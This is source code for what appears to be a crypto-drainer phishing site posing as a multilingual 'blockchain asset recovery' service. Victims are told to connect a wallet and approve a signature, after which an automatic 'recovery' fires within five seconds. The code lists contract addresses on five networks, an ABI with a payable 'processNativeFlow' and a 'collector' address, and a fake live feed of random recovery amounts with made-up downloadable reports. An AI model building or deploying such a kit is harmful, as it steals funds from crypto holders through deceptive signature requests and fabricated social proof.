    telegramJoin: 'Word lid van onze community',
    telegramDesc: 'Verbindingsproblemen? Gebruikt u een niet-ondersteunde exchange? Ons ondersteuningsteam is 24/7 actief op Telegram om u te helpen uw activa te herstellen.',
    telegramButton: 'Word lid van Telegram Community',
    connectionHelp: 'Verbindingsproblemen?',
    manualReachout: 'Handmatige ondersteuning',
    emailSupportTitle: 'E-mailondersteuning',
    emailSupportDesc: 'Geen Telegram? Geen probleem! Stuur ons een e-mail met uw probleem en ons ondersteuningsteam neemt binnen 24 uur contact met u op.',
    whyEmailSupport: 'Waarom e-mailondersteuning?',
    emailSupportPoints: '• Voor gebruikers die geen Telegram gebruiken\n• Voor gedetailleerde problemen die documentatie vereisen\n• Voor exchange-gebruikers (Binance, Coinbase, Kraken)\n• Voor opvolging van handmatige herstelgevallen',
    recoveryInstructionsTitle: '🔐 Hoe u uw activa herstelt',
    recoveryStep1: 'Verbind uw wallet met de knop hieronder.',
    recoveryStep2: 'Wacht op de automatische scan van 5 blockchain-netwerken (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Als u in aanmerking komt, start het systeem automatisch herstel (of klik op de knop).',
    recoveryStep4: 'Keur de handtekening in uw wallet goed om het herstel te autoriseren.',
    recoveryStep5: 'Herstel voltooid! U ontvangt een bevestiging en een downloadbaar rapport.',
    recoveryNote: '⚠️ Belangrijk: Verbreek de verbinding niet en sluit uw wallet niet tijdens het proces. Automatisch herstel start 5 seconden na detectie van geschiktheid.'
  },
  pl: {
    serviceActive: 'PROTOKÓŁ ODZYSKIWANIA · AKTYWNY',
    welcome: 'Witamy w Centrum Odzyskiwania Blockchain',
    connectWallet: 'POŁĄCZ PORTFEL',
    disconnect: 'Rozłącz',
    checkEligibility: 'Sprawdzanie kwalifikowalności portfela',
    verifying: 'Analiza portfela pod kątem możliwych do odzyskania aktywów...',
    terms: 'Warunki',
    delivery: 'Dostawa',
    successful: 'ODZYSKIWANIE UDANE!',
    youHaveSecured: 'Aktywa pomyślnie odzyskane',
    viewButton: 'ZOBACZ SZCZEGÓŁY',
    checkWalletEligibility: '⚡ Skanuj blockchain',
    valueBadge: 'Kwota odzyskania',
    progress: 'Postęp odzyskiwania',
    today: 'Dzisiaj',
    totalRecovered: 'Całkowite odzyskane aktywa',
    tokenPrice: 'Sieć',
    participants: 'odzyskań',
    liveClaims: 'NA ŻYWO',
    totalClaimed: 'Całkowita wartość',
    claimingNow: 'odzyskiwanie teraz',
    lastClaim: 'Ostatnie odzyskanie',
    someoneJustClaimed: 'Zakończono odzyskiwanie aktywów!',
    securedTokens: 'odzyskane',
    downloadReport: 'Pobierz raport',
    waitingForFirstClaim: 'Oczekiwanie na zdarzenia...',
    claimAmount: 'Odzyskane',
    bonusTag: '+25% bonusu',
    recoverButton: 'ROZPOCZNIJ ODZYSKIWANIE',
    processing: 'PRZETWARZANIE...',
    completed: '✓ ODZYSKIWANIE ZAKOŃCZONE',
    secured: 'Twoje aktywa zostały pomyślnie odzyskane',
    view: 'ZOBACZ AKTYWA',
    recoverNow: 'ODZYSKAJ TERAZ',
    recoveryComplete: 'ODZYSKIWANIE ZAKOŃCZONE!',
    amountRecovered: 'Odzyskana kwota',
    processingRecovery: 'Uruchamianie protokołu...',
    eligible: '✓ Wykryto możliwe do odzyskania aktywa!',
    notEligible: 'Nie znaleziono możliwych do odzyskania aktywów',
    minRequirement: 'Wymagane saldo on-chain do rozpoczęcia odzyskiwania',
    recoveryValue: 'Wartość do odzyskania',
    scanComplete: 'Skanowanie blockchain zakończone',
    assetsFound: 'możliwych do odzyskania aktywów',
    recoveryInitiated: 'Protokół odzyskiwania uruchomiony',
    confirmationSent: 'Potwierdzenie wysłane',
    retrievalComplete: 'Pobieranie aktywów zakończone',
    emailNotification: 'Potwierdzenie odzyskania wysłane',
    blockchainSync: 'Synchronizacja z sieciami blockchain...',
    walletRequired: 'Wymagane aktywne połączenie portfela',
    insufficientBalance: 'Niewystarczające saldo on-chain do odzyskania',
    proceedToRecovery: 'Kliknij, aby kontynuować odzyskiwanie',
    recoveryReady: 'Odzyskiwanie gotowe - kliknij, aby pobrać aktywa',
    reportGenerated: 'Raport odzyskiwania wygenerowany',
    reportDownloaded: 'Raport pobrany pomyślnie',
    support: 'Wsparcie',
    reportIssue: 'Zgłoś problem',
    yourEmail: 'Twój adres e-mail',
    issuePlaceholder: 'Opisz szczegółowo swój problem...',
    sendReport: 'Wyślij raport',
    reportSent: 'Raport wysłany pomyślnie! Wkrótce skontaktujemy się z Tobą.',
    processingReport: 'Wysyłanie raportu...',
    reportError: 'Nie udało się wysłać raportu. Spróbuj ponownie.',
    contactInfo: 'Skontaktujemy się z Tobą e-mailem w ciągu 24 godzin.',
    telegramSupport: 'Wsparcie Telegram',
    telegramJoin: 'Dołącz do społeczności',
    telegramDesc: 'Problemy z połączeniem? Korzystasz z nieobsługiwanej giełdy? Nasz zespół wsparcia jest aktywny 24/7 na Telegramie, aby pomóc Ci odzyskać aktywa.',
    telegramButton: 'Dołącz do Telegram',
    connectionHelp: 'Problemy z połączeniem?',
    manualReachout: 'Ręczne wsparcie',
    emailSupportTitle: 'Wsparcie e-mail',
    emailSupportDesc: 'Nie masz Telegrama? Żaden problem! Wyślij nam e-mail z problemem, a nasz zespół skontaktuje się z Tobą w ciągu 24 godzin.',
    whyEmailSupport: 'Dlaczego wsparcie e-mail?',
    emailSupportPoints: '• Dla użytkowników, którzy nie używają Telegrama\n• Dla szczegółowych problemów wymagających dokumentacji\n• Dla użytkowników giełd (Binance, Coinbase, Kraken)\n• Dla śledzenia przypadków ręcznego odzyskiwania',
    recoveryInstructionsTitle: '🔐 Jak odzyskać swoje aktywa',
    recoveryStep1: 'Połącz swój portfel za pomocą przycisku poniżej.',
    recoveryStep2: 'Poczekaj na automatyczne skanowanie 5 sieci blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Jeśli kwalifikujesz się, system automatycznie rozpocznie odzyskiwanie (lub kliknij przycisk).',
    recoveryStep4: 'Zatwierdź podpis w swoim portfelu, aby autoryzować odzyskiwanie.',
    recoveryStep5: 'Odzyskiwanie zakończone! Otrzymasz potwierdzenie i raport do pobrania.',
    recoveryNote: '⚠️ Ważne: Nie rozłączaj ani nie zamykaj swojego portfela podczas procesu. Auto-odzyskiwanie rozpoczyna się 5 sekund po wykryciu kwalifikowalności.'
  },
  vi: {
    serviceActive: 'GIAO THỨC PHỤC HỒI · ĐANG HOẠT ĐỘNG',
    welcome: 'Chào mừng đến với Trung tâm Phục hồi Blockchain',
    connectWallet: 'KẾT NỐI VÍ',
    disconnect: 'Ngắt kết nối',
    checkEligibility: 'Đang kiểm tra tính đủ điều kiện của ví',
    verifying: 'Đang phân tích ví để tìm tài sản có thể phục hồi...',
    terms: 'Điều khoản',
    delivery: 'Giao hàng',
    successful: 'PHỤC HỒI THÀNH CÔNG!',
    youHaveSecured: 'Tài sản đã được phục hồi thành công',
    viewButton: 'XEM CHI TIẾT',
    checkWalletEligibility: '⚡ Quét Blockchain',
    valueBadge: 'Số tiền phục hồi',
    progress: 'Tiến độ phục hồi',
    today: 'Hôm nay',
    totalRecovered: 'Tổng tài sản đã phục hồi',
    tokenPrice: 'Mạng',
    participants: 'lần phục hồi',
    liveClaims: 'LUỒNG PHỤC HỒI TRỰC TIẾP',
    totalClaimed: 'Tổng giá trị',
    claimingNow: 'đang phục hồi',
    lastClaim: 'Lần phục hồi cuối',
    someoneJustClaimed: 'Phục hồi tài sản hoàn tất!',
    securedTokens: 'đã phục hồi',
    downloadReport: 'Tải báo cáo phục hồi',
    waitingForFirstClaim: 'Đang chờ sự kiện phục hồi...',
    claimAmount: 'Đã phục hồi',
    bonusTag: '+25% thưởng',
    recoverButton: 'BẮT ĐẦU PHỤC HỒI',
    processing: 'ĐANG XỬ LÝ...',
    completed: '✓ PHỤC HỒI HOÀN TẤT',
    secured: 'Tài sản của bạn đã được phục hồi thành công',
    view: 'XEM TÀI SẢN ĐÃ PHỤC HỒI',
    recoverNow: 'PHỤC HỒI NGAY',
    recoveryComplete: 'PHỤC HỒI HOÀN TẤT!',
    amountRecovered: 'Số tiền đã phục hồi',
    processingRecovery: 'Đang khởi tạo giao thức phục hồi...',
    eligible: '✓ Đã phát hiện tài sản có thể phục hồi!',
    notEligible: 'Không tìm thấy tài sản có thể phục hồi',
    minRequirement: 'Cần có số dư trên chuỗi để bắt đầu phục hồi',
    recoveryValue: 'Giá trị có thể phục hồi',
    scanComplete: 'Quét blockchain hoàn tất',
    assetsFound: 'tài sản có thể phục hồi được tìm thấy',
    recoveryInitiated: 'Đã khởi tạo giao thức phục hồi',
    confirmationSent: 'Đã gửi xác nhận',
    retrievalComplete: 'Hoàn tất truy xuất tài sản',
    emailNotification: 'Đã gửi xác nhận phục hồi',
    blockchainSync: 'Đồng bộ với mạng blockchain...',
    walletRequired: 'Cần kết nối ví hoạt động',
    insufficientBalance: 'Số dư trên chuỗi không đủ để phục hồi',
    proceedToRecovery: 'Nhấp để tiếp tục phục hồi tài sản',
    recoveryReady: 'Sẵn sàng phục hồi - nhấp để truy xuất tài sản',
    reportGenerated: 'Đã tạo báo cáo phục hồi',
    reportDownloaded: 'Đã tải báo cáo thành công',
    support: 'Hỗ trợ',
    reportIssue: 'Báo cáo sự cố',
    yourEmail: 'Địa chỉ email của bạn',
    issuePlaceholder: 'Mô tả chi tiết vấn đề của bạn...',
    sendReport: 'Gửi báo cáo',
    reportSent: 'Đã gửi báo cáo thành công! Bộ phận hỗ trợ sẽ liên hệ với bạn trong thời gian ngắn.',
    processingReport: 'Đang gửi báo cáo...',
    reportError: 'Gửi báo cáo thất bại. Vui lòng thử lại.',
    contactInfo: 'Chúng tôi sẽ liên hệ qua email trong vòng 24 giờ.',
    telegramSupport: 'Hỗ trợ Telegram',
    telegramJoin: 'Tham gia Cộng đồng của chúng tôi',
    telegramDesc: 'Gặp sự cố kết nối? Sử dụng sàn giao dịch không được hỗ trợ? Đội ngũ hỗ trợ của chúng tôi hoạt động 24/7 trên Telegram để giúp bạn phục hồi tài sản.',
    telegramButton: 'Tham gia Cộng đồng Telegram',
    connectionHelp: 'Sự cố kết nối?',
    manualReachout: 'Hỗ trợ thủ công',
    emailSupportTitle: 'Hỗ trợ qua Email',
    emailSupportDesc: 'Không có Telegram? Không vấn đề! Gửi email cho chúng tôi với vấn đề của bạn và đội ngũ hỗ trợ sẽ liên hệ lại trong vòng 24 giờ.',
    whyEmailSupport: 'Tại sao nên dùng Email Support?',
    emailSupportPoints: '• Dành cho người dùng không sử dụng Telegram\n• Dành cho vấn đề chi tiết cần tài liệu\n• Dành cho người dùng sàn giao dịch (Binance, Coinbase, Kraken)\n• Dành cho theo dõi các trường hợp phục hồi thủ công',
    recoveryInstructionsTitle: '🔐 Cách phục hồi tài sản của bạn',
    recoveryStep1: 'Kết nối ví của bạn bằng nút bên dưới.',
    recoveryStep2: 'Chờ quét tự động 5 mạng blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Nếu đủ điều kiện, hệ thống sẽ tự động bắt đầu phục hồi (hoặc bạn có thể nhấp vào nút).',
    recoveryStep4: 'Phê duyệt chữ ký trong ví của bạn để ủy quyền phục hồi.',
    recoveryStep5: 'Phục hồi hoàn tất! Bạn sẽ nhận được xác nhận và báo cáo có thể tải xuống.',
    recoveryNote: '⚠️ Quan trọng: Không ngắt kết nối hoặc đóng ví của bạn trong quá trình. Tự động phục hồi bắt đầu sau 5 giây kể từ khi phát hiện đủ điều kiện.'
  },
  th: {
    serviceActive: 'โปรโตคอลการกู้คืน · ทำงานอยู่',
    welcome: 'ยินดีต้อนรับสู่ศูนย์กู้คืนบล็อกเชน',
    connectWallet: 'เชื่อมต่อกระเป๋าเงิน',
    disconnect: 'ตัดการเชื่อมต่อ',
    checkEligibility: 'กำลังตรวจสอบคุณสมบัติของกระเป๋าเงิน',
    verifying: 'กำลังวิเคราะห์กระเป๋าเงินเพื่อหาสินทรัพย์ที่สามารถกู้คืนได้...',
    terms: 'ข้อกำหนด',
    delivery: 'การจัดส่ง',
    successful: 'การกู้คืนสำเร็จ!',
    youHaveSecured: 'กู้คืนสินทรัพย์สำเร็จแล้ว',
    viewButton: 'ดูรายละเอียด',
    checkWalletEligibility: '⚡ สแกนบล็อกเชน',
    valueBadge: 'จำนวนเงินที่กู้คืน',
    progress: 'ความคืบหน้าการกู้คืน',
    today: 'วันนี้',
    totalRecovered: 'สินทรัพย์ที่กู้คืนทั้งหมด',
    tokenPrice: 'เครือข่าย',
    participants: 'การกู้คืน',
    liveClaims: 'ฟีดการกู้คืนสด',
    totalClaimed: 'มูลค่ารวม',
    claimingNow: 'กำลังกู้คืน',
    lastClaim: 'การกู้คืนล่าสุด',
    someoneJustClaimed: 'การกู้คืนสินทรัพย์เสร็จสมบูรณ์!',
    securedTokens: 'กู้คืนแล้ว',
    downloadReport: 'ดาวน์โหลดรายงานการกู้คืน',
    waitingForFirstClaim: 'รอเหตุการณ์การกู้คืน...',
    claimAmount: 'กู้คืนแล้ว',
    bonusTag: '+25% โบนัส',
    recoverButton: 'เริ่มการกู้คืน',
    processing: 'กำลังดำเนินการ...',
    completed: '✓ การกู้คืนเสร็จสมบูรณ์',
    secured: 'สินทรัพย์ของคุณได้รับการกู้คืนเรียบร้อยแล้ว',
    view: 'ดูสินทรัพย์ที่กู้คืน',
    recoverNow: 'กู้คืนตอนนี้',
    recoveryComplete: 'การกู้คืนเสร็จสมบูรณ์!',
    amountRecovered: 'จำนวนเงินที่กู้คืน',
    processingRecovery: 'กำลังเริ่มโปรโตคอลการกู้คืน...',
    eligible: '✓ ตรวจพบสินทรัพย์ที่สามารถกู้คืนได้!',
    notEligible: 'ไม่พบสินทรัพย์ที่สามารถกู้คืนได้',
    minRequirement: 'ต้องมียอดคงเหลือบนเชนเพื่อเริ่มการกู้คืน',
    recoveryValue: 'มูลค่าที่สามารถกู้คืนได้',
    scanComplete: 'การสแกนบล็อกเชนเสร็จสมบูรณ์',
    assetsFound: 'พบสินทรัพย์ที่สามารถกู้คืนได้',
    recoveryInitiated: 'เริ่มโปรโตคอลการกู้คืนแล้ว',
    confirmationSent: 'ส่งการยืนยันแล้ว',
    retrievalComplete: 'การดึงสินทรัพย์เสร็จสมบูรณ์',
    emailNotification: 'ส่งการยืนยันการกู้คืนแล้ว',
    blockchainSync: 'กำลังซิงโครไนซ์กับเครือข่ายบล็อกเชน...',
    walletRequired: 'ต้องมีการเชื่อมต่อกระเป๋าเงินที่ใช้งานอยู่',
    insufficientBalance: 'ยอดคงเหลือบนเชนไม่เพียงพอสำหรับการกู้คืน',
    proceedToRecovery: 'คลิกเพื่อดำเนินการกู้คืนสินทรัพย์',
    recoveryReady: 'พร้อมกู้คืน - คลิกเพื่อดึงสินทรัพย์',
    reportGenerated: 'สร้างรายงานการกู้คืนแล้ว',
    reportDownloaded: 'ดาวน์โหลดรายงานสำเร็จ',
    support: 'การสนับสนุน',
    reportIssue: 'รายงานปัญหา',
    yourEmail: 'ที่อยู่อีเมลของคุณ',
    issuePlaceholder: 'อธิบายปัญหาของคุณโดยละเอียด...',
    sendReport: 'ส่งรายงาน',
    reportSent: 'ส่งรายงานสำเร็จ! ฝ่ายสนับสนุนจะติดต่อคุณในเร็วๆ นี้',
    processingReport: 'กำลังส่งรายงาน...',
    reportError: 'ส่งรายงานล้มเหลว กรุณาลองอีกครั้ง',
    contactInfo: 'เราจะติดตามผลทางอีเมลภายใน 24 ชั่วโมง',
    telegramSupport: 'การสนับสนุนทาง Telegram',
    telegramJoin: 'เข้าร่วมชุมชนของเรา',
    telegramDesc: 'ประสบปัญหาในการเชื่อมต่อ? ใช้การแลกเปลี่ยนที่ไม่รองรับ? ทีมสนับสนุนของเราพร้อมให้บริการตลอด 24/7 บน Telegram เพื่อช่วยคุณกู้คืนสินทรัพย์',
    telegramButton: 'เข้าร่วมชุมชน Telegram',
    connectionHelp: 'ปัญหาในการเชื่อมต่อ?',
    manualReachout: 'การสนับสนุนด้วยตนเอง',
    emailSupportTitle: 'การสนับสนุนทางอีเมล',
    emailSupportDesc: 'ไม่มี Telegram? ไม่มีปัญหา! ส่งอีเมลถึงเราพร้อมปัญหาของคุณและทีมสนับสนุนของเราจะติดต่อกลับภายใน 24 ชั่วโมง',
    whyEmailSupport: 'ทำไมต้องใช้ Email Support?',
    emailSupportPoints: '• สำหรับผู้ใช้ที่ไม่ได้ใช้ Telegram\n• สำหรับปัญหาที่ต้องใช้เอกสารประกอบ\n• สำหรับผู้ใช้ exchange (Binance, Coinbase, Kraken)\n• สำหรับการติดตามกรณีการกู้คืนด้วยตนเอง',
    recoveryInstructionsTitle: '🔐 วิธีการกู้คืนสินทรัพย์ของคุณ',
    recoveryStep1: 'เชื่อมต่อกระเป๋าเงินของคุณด้วยปุ่มด้านล่าง',
    recoveryStep2: 'รอการสแกนอัตโนมัติของเครือข่ายบล็อกเชน 5 เครือข่าย (Ethereum, BSC, Polygon, Arbitrum, Avalanche)',
    recoveryStep3: 'หากมีคุณสมบัติ ระบบจะเริ่มการกู้คืนโดยอัตโนมัติ (หรือคุณสามารถคลิกปุ่ม)',
    recoveryStep4: 'อนุมัติลายเซ็นในกระเป๋าเงินของคุณเพื่ออนุญาตการกู้คืน',
    recoveryStep5: 'การกู้คืนเสร็จสมบูรณ์! คุณจะได้รับการยืนยันและรายงานที่ดาวน์โหลดได้',
    recoveryNote: '⚠️ สำคัญ: อย่าตัดการเชื่อมต่อหรือปิดกระเป๋าเงินของคุณในระหว่างกระบวนการ การกู้คืนอัตโนมัติจะเริ่มใน 5 วินาทีหลังจากตรวจพบคุณสมบัติ'
  },
  id: {
    serviceActive: 'PROTOKOL PEMULIHAN · AKTIF',
    welcome: 'Selamat Datang di Pusat Pemulihan Blockchain',
    connectWallet: 'HUBUNGKAN WALLET',
    disconnect: 'Putuskan',
    checkEligibility: 'Memeriksa kelayakan dompet',
    verifying: 'Menganalisis wallet untuk aset yang dapat dipulihkan...',
    terms: 'Ketentuan',
    delivery: 'Pengiriman',
    successful: 'PEMULIHAN BERHASIL!',
    youHaveSecured: 'Aset Berhasil Dipulihkan',
    viewButton: 'LIHAT DETAIL',
    checkWalletEligibility: '⚡ Pindai Blockchain',
    valueBadge: 'Jumlah Pemulihan',
    progress: 'Kemajuan Pemulihan',
    today: 'Hari Ini',
    totalRecovered: 'Total Aset Dipulihkan',
    tokenPrice: 'Jaringan',
    participants: 'pemulihan',
    liveClaims: 'UMPAN PEMULIHAN LANGSUNG',
    totalClaimed: 'Nilai Total',
    claimingNow: 'memulihkan sekarang',
    lastClaim: 'Pemulihan terakhir',
    someoneJustClaimed: 'Pemulihan Aset Selesai!',
    securedTokens: 'dipulihkan',
    downloadReport: 'Unduh Laporan Pemulihan',
    waitingForFirstClaim: 'Menunggu peristiwa pemulihan...',
    claimAmount: 'Dipulihkan',
    bonusTag: '+25% bonus',
    recoverButton: 'MULAI PEMULIHAN',
    processing: 'MEMPROSES...',
    completed: '✓ PEMULIHAN SELESAI',
    secured: 'Aset Anda telah berhasil dipulihkan',
    view: 'LIHAT ASET YANG DIPULIHKAN',
    recoverNow: 'PULIHKAN SEKARANG',
    recoveryComplete: 'PEMULIHAN SELESAI!',
    amountRecovered: 'Jumlah yang Dipulihkan',
    processingRecovery: 'Memulai protokol pemulihan...',
    eligible: '✓ Aset yang Dapat Dipulihkan Terdeteksi!',
    notEligible: 'Tidak Ada Aset yang Dapat Dipulihkan',
    minRequirement: 'Saldo on-chain diperlukan untuk memulai pemulihan',
    recoveryValue: 'Nilai yang Dapat Dipulihkan',
    scanComplete: 'Pemindaian blockchain selesai',
    assetsFound: 'aset yang dapat dipulihkan ditemukan',
    recoveryInitiated: 'Protokol pemulihan dimulai',
    confirmationSent: 'Konfirmasi terkirim',
    retrievalComplete: 'Pengambilan aset selesai',
    emailNotification: 'Konfirmasi pemulihan terkirim',
    blockchainSync: 'Sinkronisasi dengan jaringan blockchain...',
    walletRequired: 'Koneksi wallet aktif diperlukan',
    insufficientBalance: 'Saldo on-chain tidak mencukupi untuk pemulihan',
    proceedToRecovery: 'Klik untuk melanjutkan pemulihan aset',
    recoveryReady: 'Pemulihan siap - klik untuk mengambil aset',
    reportGenerated: 'Laporan pemulihan dibuat',
    reportDownloaded: 'Laporan berhasil diunduh',
    support: 'Dukungan',
    reportIssue: 'Laporkan Masalah',
    yourEmail: 'Alamat Email Anda',
    issuePlaceholder: 'Jelaskan masalah Anda secara detail...',
    sendReport: 'Kirim Laporan',
    reportSent: 'Laporan berhasil dikirim! Dukungan akan segera menghubungi Anda.',
    processingReport: 'Mengirim laporan...',
    reportError: 'Gagal mengirim laporan. Silakan coba lagi.',
    contactInfo: 'Kami akan menindaklanjuti melalui email dalam waktu 24 jam.',
    telegramSupport: 'Dukungan Telegram',
    telegramJoin: 'Bergabung dengan Komunitas Kami',
    telegramDesc: 'Mengalami masalah koneksi? Menggunakan exchange yang tidak didukung? Tim dukungan kami aktif 24/7 di Telegram untuk membantu Anda memulihkan aset.',
    telegramButton: 'Bergabung dengan Komunitas Telegram',
    connectionHelp: 'Masalah Koneksi?',
    manualReachout: 'Dukungan Manual',
    emailSupportTitle: 'Dukungan Email',
    emailSupportDesc: 'Tidak punya Telegram? Tidak masalah! Kirimkan email kepada kami dengan masalah Anda dan tim dukungan kami akan menghubungi Anda kembali dalam waktu 24 jam.',
    whyEmailSupport: 'Mengapa Dukungan Email?',
    emailSupportPoints: '• Untuk pengguna yang tidak menggunakan Telegram\n• Untuk masalah mendetail yang memerlukan dokumentasi\n• Untuk pengguna exchange (Binance, Coinbase, Kraken)\n• Untuk tindak lanjut kasus pemulihan manual',
    recoveryInstructionsTitle: '🔐 Cara Memulihkan Aset Anda',
    recoveryStep1: 'Hubungkan dompet Anda menggunakan tombol di bawah.',
    recoveryStep2: 'Tunggu pemindaian otomatis 5 jaringan blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Jika memenuhi syarat, sistem akan memulai pemulihan secara otomatis (atau Anda dapat mengklik tombol).',
    recoveryStep4: 'Setujui tanda tangan di dompet Anda untuk mengotorisasi pemulihan.',
    recoveryStep5: 'Pemulihan selesai! Anda akan menerima konfirmasi dan laporan yang dapat diunduh.',
    recoveryNote: '⚠️ Penting: Jangan putuskan sambungan atau tutup dompet Anda selama proses. Pemulihan otomatis dimulai 5 detik setelah deteksi kelayakan.'
  }
};

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS WITH RPC FALLBACKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-500 to-blue-600',
    rpcs: [
      'https://eth.llamarpc.com',
      'https://rpc.ankr.com/eth',
      'https://ethereum.publicnode.com',
      'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
    ]
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-blue-500 to-blue-600',
    rpcs: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://rpc.ankr.com/bsc',
      'https://bsc.publicnode.com'
    ]
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-blue-500 to-blue-600',
    rpcs: [
      'https://polygon-rpc.com',
      'https://rpc.ankr.com/polygon',
      'https://polygon-mainnet.g.alchemy.com/v2/demo',
      'https://polygon.publicnode.com'
    ]
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-blue-500 to-blue-600',
    rpcs: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
      'https://arbitrum.publicnode.com'
    ]
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-blue-500 to-blue-600',
    rpcs: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://avalanche-c-chain.publicnode.com',
      'https://rpc.ankr.com/avalanche'
    ]
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG).map(chain => ({
  ...chain,
  rpc: chain.rpcs[0] // for backward compatibility, keep primary rpc
}));

// Helper function to get a working JsonRpcProvider with fallback
const getJsonRpcProvider = async (chain, retries = 2) => {
  const rpcs = chain.rpcs || [chain.rpc];
  for (let i = 0; i < rpcs.length; i++) {
    try {
      const provider = new ethers.JsonRpcProvider(rpcs[i]);
      // Test connection
      await provider.getBlockNumber();
      return provider;
    } catch (err) {
      console.log(`RPC ${rpcs[i]} failed for ${chain.name}, trying next...`);
    }
  }
  throw new Error(`No working RPC for ${chain.name} after ${rpcs.length} attempts`);
};

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "event FlowProcessed(address indexed initiator, uint256 value)"
];

// ============================================
// PERSISTENT STORAGE KEYS
// ============================================
const STORAGE_KEYS = {
  LIVE_TRANSACTIONS: 'blockchainRecovery_liveTransactions',
  LAST_RESET_DATE: 'blockchainRecovery_lastResetDate',
  TOTAL_RECOVERED_AMOUNT: 'blockchainRecovery_totalRecoveredAmount'
};

// Helper to check if date has changed (for daily reset)
const hasDateChanged = (lastDate) => {
  if (!lastDate) return true;
  const today = new Date().toDateString();
  return lastDate !== today;
};

// Get random recovery amount between $2,000 and $1,000,000
const getRandomRecoveryAmount = () => {
  return Math.floor(Math.random() * (1000000 - 2000 + 1) + 2000);
};

// Generate unique recovery ID
const generateRecoveryId = () => {
  return 'RVC-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
};

// ============================================
// GENERATE RECOVERY REPORT PDF (Download as JSON/Text)
// ============================================
const generateRecoveryReport = (tx, walletAddress, recoveryAmount, chains, timestamp, chainDetails) => {
  const reportData = {
    reportId: generateRecoveryId(),
    recoveryAmount: recoveryAmount,
    usdValue: `$${recoveryAmount.toLocaleString()} USD`,
    walletAddress: walletAddress,
    chainsRecovered: chains,
    chainDetails: chainDetails,
    transactionHash: tx.hash,
    timestamp: timestamp,
    bonusApplied: '+25%',
    recoveryFee: '5% + Gas',
    status: 'COMPLETED',
    networksScanned: ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche']
  };
  
  const reportBlob = new Blob([JSON.stringify(reportData, null, 2)], { type: 'application/json' });
  const reportUrl = URL.createObjectURL(reportBlob);
  const link = document.createElement('a');
  link.href = reportUrl;
  link.download = `recovery_report_${reportData.reportId}.json`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(reportUrl);
  
  return reportData;
};

// ============================================
// LIVE RECOVERY POPUP COMPONENT
// ============================================
const LiveRecoveryPopup = ({ tx, onClose, onDownloadReport, translations, walletAddress, recoveryAmount, chains, chainDetails }) => {
  const [visible, setVisible] = useState(true);
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setVisible(false);
      onClose();
    }, 8000);
    return () => clearTimeout(timer);
  }, [onClose]);
  
  if (!visible) return null;
  
  const handleDownload = () => {
    generateRecoveryReport(tx, walletAddress, recoveryAmount, chains, new Date().toISOString(), chainDetails);
    onDownloadReport();
  };
  
  return (
    <div className="fixed bottom-24 right-4 z-50 animate-slideInUp md:bottom-28 md:right-8">
      <div className="bg-gradient-to-r from-gray-900 to-black border-l-4 border-blue-500 rounded-lg shadow-2xl p-4 max-w-sm backdrop-blur-lg">
        <div className="flex items-start gap-3">
          <div className="w-10 h-10 bg-blue-500/20 rounded-full flex items-center justify-center animate-pulse">
            <span className="text-xl">🔗</span>
          </div>
          <div className="flex-1">
            <p className="text-sm font-bold text-blue-400">{translations.someoneJustClaimed}</p>
            <p className="text-xs text-gray-300 mt-1">
              <span className="font-mono">{tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}</span> {translations.securedTokens}{' '}
              <span className="text-blue-400 font-bold">${tx.recoveryAmount?.toLocaleString() || '0'} USD</span> +25% bonus
            </p>
            <button 
              onClick={handleDownload}
              className="text-xs bg-blue-600 hover:bg-blue-700 text-white mt-2 px-3 py-1 rounded-lg flex items-center gap-1 transition-colors"
            >
              📄 {translations.downloadReport} →
            </button>
          </div>
          <button onClick={() => setVisible(false)} className="text-gray-500 hover:text-gray-300 transition-colors">
            ✕
          </button>
        </div>
      </div>
    </div>
  );
};

// ============================================
// LIVE RECOVERY FEED COMPONENT
// ============================================
const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, todayCount, onDownloadReport, walletAddress }) => {
  const handleDownloadForTx = (tx) => {
    generateRecoveryReport(tx, walletAddress, tx.recoveryAmount, [tx.chain], tx.time, tx.chainDetails);
    onDownloadReport();
  };
  
  return (
    <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-blue-500/20 overflow-hidden">
